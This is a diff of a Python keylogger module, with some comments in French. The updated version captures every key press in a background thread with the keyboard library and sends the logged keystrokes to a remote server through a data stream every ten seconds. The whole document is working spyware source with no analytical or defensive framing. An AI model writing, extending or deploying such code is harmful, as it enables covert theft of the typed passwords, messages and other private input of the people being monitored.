@@ -1,33 +1,44 @@
-from pynput.keyboard import Listener
+import keyboard
+import threading
+import time
 
 key_log = []
 
-def log_keystrokes(key):
+def log_keystrokes():
     """
-    Listen to pressed keys and append to a list
+    Listen to pressed keys and append them to a list.
     """
-    try:
-        key_log.append(key.char)
-    except AttributeError:
-        if key == key.space:
-            key_log.append(" ")
-        else:
-            key_log.append(f" [{key}] ")
-
-def start_keylogger():
-    """
-    init keylogger in a separate thread
-    """
-    with Listener(on_press=log_keystrokes) as listener:
-        listener.join()
+    while True:
+        event = keyboard.read_event()
+        if event.event_type == "down":  # Capture uniquement la pression sur une touche
+            key = event.name
+            if key == "space":
+                key_log.append(" ")
+            elif len(key) == 1:  # Si c'est un caractère imprimable
+                key_log.append(key)
+            else:  # Pour les touches spéciales
+                key_log.append(f" [{key}] ")
 
 def send_keylogs(data_stream):
     """
-    send keys to server
+    Send captured keys to a server.
     """
     if key_log:
         logs = "".join(key_log)
         data_stream.send(str.encode(f"Keylogs:\n{logs}\n"))
-        key_log.clear()  # Vide le journal après l'envoi
+        key_log.clear()  # Clear the log after sending
     else:
-        data_stream.send(str.encode("not keys pressed.\n"))
+        data_stream.send(str.encode("No keys pressed.\n"))
+
+def start_keylogger(data_stream):
+    """
+    Initialize the keylogger in a separate thread.
+    """
+    # Lancer la capture des frappes dans un thread séparé
+    keylogger_thread = threading.Thread(target=log_keystrokes, daemon=True)
+    keylogger_thread.start()
+    
+    # Simulation d'envoi régulier des données
+    while True:
+        send_keylogs(data_stream)
+        time.sleep(10)  # Envoi toutes les 10 secondes
